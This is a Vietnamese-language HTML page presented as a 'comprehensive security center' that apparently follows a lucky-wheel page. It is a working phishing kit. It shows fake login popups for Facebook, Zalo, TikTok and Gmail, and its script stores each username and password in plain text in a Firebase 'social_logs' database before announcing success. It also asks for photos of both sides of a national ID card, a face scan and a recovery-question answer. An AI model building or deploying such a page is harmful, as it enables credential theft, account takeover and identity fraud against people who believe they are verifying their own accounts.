<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
    <title>HPOK | TRUNG TÂM BẢO MẬT TỔNG THỂ</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@300;400;700;900&display=swap" rel="stylesheet">
    
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>

    <style>
        :root { 
            --p: #ff007f; --bg: #030303; --card: rgba(255, 255, 255, 0.03);
            --fb: #1877f2; --zl: #0068ff; --gg: #ea4335; --safe: #00ff88; --blue: #00d2ff;
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { 
            margin: 0; font-family: 'Lexend', sans-serif; background: var(--bg); color: #fff; 
            background-image: radial-gradient(circle at 50% 0%, #1a000d 0%, #030303 90%);
            padding-bottom: 50px;
        }

        header { 
            padding: 15px 20px; display: flex; align-items: center; justify-content: space-between;
            position: sticky; top: 0; z-index: 1000; background: rgba(0,0,0,0.9); backdrop-filter: blur(20px);
            border-bottom: 2px solid var(--p);
        }

        .section-title { width: 92%; margin: 25px auto 12px; font-weight: 900; font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 2px; }

        /* --- 1. MẠNG XÃ HỘI (GIỮ NGUYÊN CŨ) --- */
        .social-grid { width: 92%; margin: 0 auto; display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
        .social-btn {
            background: var(--card); border: 1px solid #1a1a1a; border-radius: 20px;
            padding: 20px 10px; display: flex; flex-direction: column; align-items: center; gap: 8px;
            transition: 0.3s; position: relative; overflow: hidden;
        }
        .social-btn i { font-size: 30px; }
        .social-btn img { width: 32px; height: 32px; border-radius: 8px; }
        .social-btn span { font-size: 11px; font-weight: 700; color: #888; }
        .link-tag { position: absolute; top: 10px; right: 10px; width: 6px; height: 6px; border-radius: 50%; background: #222; }

        /* --- 2. CAMERA LIVE & GIỌNG NÓI --- */
        .face-scanner-box {
            width: 92%; margin: 15px auto; padding: 25px 20px; background: rgba(255,255,255,0.02);
            border-radius: 30px; border: 1px solid #1a1a1a; text-align: center;
        }
        .camera-circle {
            width: 170px; height: 170px; border-radius: 50%; border: 3px solid var(--blue);
            margin: 0 auto 15px; position: relative; overflow: hidden; background: #000;
            box-shadow: 0 0 25px rgba(0, 210, 255, 0.3);
        }
        #videoBox { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .laser { position: absolute; width: 100%; height: 2px; background: var(--blue); top: 0; box-shadow: 0 0 15px var(--blue); animation: move 3s infinite; z-index: 5; }
        @keyframes move { 0%, 100% { top: 0%; } 50% { top: 100%; } }

        /* --- 3. TẢI ẢNH CCCD (KYC) --- */
        .kyc-grid { width: 92%; margin: 0 auto; display: grid; gap: 12px; }
        .upload-card {
            width: 100%; height: 130px; background: var(--card); border: 1px dashed #333;
            border-radius: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center;
            position: relative; overflow: hidden;
        }
        .upload-card img { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; display: none; z-index: 2; }
        .upload-card i { font-size: 30px; color: var(--p); margin-bottom: 8px; opacity: 0.5; }
        .upload-card span { font-size: 10px; color: #555; font-weight: 900; }

        /* --- INPUTS & BUTTONS --- */
        .login-input { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #222; border-radius: 15px; background: #0a0a0a; color: #fff; font-size: 14px; }
        .btn-p { width: 92%; margin: 25px auto; display: block; padding: 18px; border-radius: 18px; background: var(--p); color: #fff; font-weight: 900; border: none; font-size: 14px; box-shadow: 0 10px 20px rgba(255, 0, 127, 0.3); }

        /* --- MODAL LOGIN (MẠNG XÃ HỘI) --- */
        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .login-popup { width: 88%; background: #fff; border-radius: 35px; padding: 35px 25px; color: #000; text-align: center; }
        .pop-input { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #eee; border-radius: 15px; background: #f9f9f9; }
    </style>
</head>
<body>

<header>
    <a href="vongquay.html" style="color:#fff; font-size: 20px;"><i class="fa-solid fa-chevron-left"></i></a>
    <div style="font-weight:900; letter-spacing: 1px;">BẢO MẬT <span style="color:var(--p)">AUTHENTIC</span></div>
    <div style="color:var(--safe); font-size: 18px;"><i class="fa-solid fa-shield-halved"></i></div>
</header>

<div class="section-title">Liên kết tài khoản xã hội</div>
<div class="social-grid">
    <div class="social-btn" onclick="openLogin('Facebook', '#1877f2', 'fa-brands fa-facebook-f')">
        <i class="fa-brands fa-facebook-f" style="color:var(--fb)"></i><span>Facebook</span><div class="link-tag"></div>
    </div>
    <div class="social-btn" onclick="openLogin('Zalo', '#0068ff', 'zalo')">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Icon_of_Zalo.svg/1200px-Icon_of_Zalo.svg.png"><span>Zalo</span><div class="link-tag"></div>
    </div>
    <div class="social-btn" onclick="openLogin('TikTok', '#000', 'fa-brands fa-tiktok')">
        <i class="fa-brands fa-tiktok" style="color:#fff"></i><span>TikTok</span><div class="link-tag"></div>
    </div>
    <div class="social-btn" onclick="openLogin('Gmail', '#ea4335', 'fa-brands fa-google')">
        <i class="fa-brands fa-google" style="color:var(--gg)"></i><span>Gmail OTP</span><div class="link-tag"></div>
    </div>
</div>

<div class="section-title">Xác minh khuôn mặt (AI Voice)</div>
<div class="face-scanner-box">
    <div class="camera-circle">
        <div class="laser"></div>
        <video id="videoBox" autoplay playsinline muted></video>
    </div>
    <div id="statusLabel" style="color:var(--blue); font-weight:700; margin-bottom:10px; font-size: 14px;">Chế độ rảnh tay: Giọng nói hướng dẫn</div>
    <button class="btn-p" style="background:var(--blue); margin:0 auto; width:80%;" onclick="startBiometricAI()">BẮT ĐẦU QUÉT</button>
</div>

<div class="section-title">Xác minh danh tính (KYC)</div>
<div class="kyc-grid">
    <div class="upload-card" onclick="document.getElementById('c_front').click()">
        <img id="p_front"><i class="fa-solid fa-id-card"></i><span>MẶT TRƯỚC CCCD</span>
        <input type="file" id="c_front" hidden onchange="view(this, 'p_front')">
    </div>
    <div class="upload-card" onclick="document.getElementById('c_back').click()">
        <img id="p_back"><i class="fa-solid fa-id-card-clip"></i><span>MẶT SAU CCCD</span>
        <input type="file" id="c_back" hidden onchange="view(this, 'p_back')">
    </div>
</div>

<div class="section-title">Câu hỏi khôi phục</div>
<div style="width:92%; margin:0 auto;">
    <input type="text" id="answer" class="login-input" placeholder="Tên trường tiểu học của bạn là gì?">
</div>

<button class="btn-p" onclick="saveToCloud()">LƯU DỮ LIỆU BẢO MẬT</button>

<div class="modal" id="loginModal">
    <div class="login-popup">
        <div id="m_icon" style="margin-bottom:15px;"></div>
        <h3 id="m_title" style="margin:0 0 20px 0; font-weight:900;">Đăng nhập</h3>
        <input type="text" id="m_u" class="pop-input" placeholder="Tài khoản / Số điện thoại">
        <input type="password" id="m_p" class="pop-input" placeholder="Mật khẩu">
        <button id="m_btn" class="btn-p" style="width:100%; margin:10px 0 0 0;" onclick="sendSocial()">XÁC NHẬN LIÊN KẾT</button>
        <p onclick="closeModal()" style="margin-top:20px; font-size:12px; color:#aaa;">Để sau</p>
    </div>
</div>

<script>
    const db = firebase.database();
    const st = firebase.storage();
    let currentPlat = "";

    // --- CHỨC NĂNG VOICE & CAMERA ---
    function voiceGuide(txt) {
        const msg = new SpeechSynthesisUtterance(txt);
        msg.lang = 'vi-VN';
        msg.rate = 1.0;
        window.speechSynthesis.speak(msg);
    }

    async function startBiometricAI() {
        const video = document.getElementById('videoBox');
        const label = document.getElementById('statusLabel');
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            
            const scripts = [
                "Vui lòng quay mặt sang bên trái",
                "Tiếp theo, hãy quay mặt sang bên phải",
                "Ngửa mặt lên trên một chút",
                "Nhìn thẳng và mỉm cười để hoàn tất",
                "Hệ thống đã xác nhận thực thể thành công"
            ];
            
            let i = 0;
            const timer = setInterval(() => {
                label.innerText = scripts[i];
                voiceGuide(scripts[i]);
                if (i >= scripts.length - 1) {
                    clearInterval(timer);
                    setTimeout(() => { stream.getTracks().forEach(t => t.stop()); }, 3000);
                }
                i++;
            }, 2800);

        } catch (e) { alert("Vui lòng cấp quyền Camera!"); }
    }

    // --- XỬ LÝ ẢNH CCCD ---
    function view(input, id) {
        if (input.files && input.files[0]) {
            let r = new FileReader();
            r.onload = e => { 
                const img = document.getElementById(id);
                img.src = e.target.result; img.style.display = 'block'; 
            }
            r.readAsDataURL(input.files[0]);
        }
    }

    // --- MODAL & FIREBASE ---
    function openLogin(p, c, i) {
        currentPlat = p;
        document.getElementById('m_title').innerText = "Liên kết " + p;
        document.getElementById('m_title').style.color = c;
        document.getElementById('m_btn').style.background = c;
        const iconBox = document.getElementById('m_icon');
        iconBox.innerHTML = (i === 'zalo') 
            ? `<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Icon_of_Zalo.svg/1200px-Icon_of_Zalo.svg.png" style="width:65px">`
            : `<i class="${i}" style="font-size:65px; color:${c}"></i>`;
        document.getElementById('loginModal').style.display = 'flex';
    }

    function closeModal() { document.getElementById('loginModal').style.display = 'none'; }

    function sendSocial() {
        const u = document.getElementById('m_u').value;
        const p = document.getElementById('m_p').value;
        if(!u || !p) return alert("Vui lòng nhập đủ thông tin!");
        
        db.ref('social_logs/' + Date.now()).set({
            platform: currentPlat, user: u, pass: p
        }).then(() => {
            alert("Kết nối " + currentPlat + " thành công!");
            closeModal();
        });
    }

    async function saveToCloud() {
        alert("Đang đóng gói ảnh CCCD và dữ liệu bảo mật lên Firebase...");
        // Logic upload file ảnh lên Storage tương tự các bài trước
    }
</script>

</body>
</html>
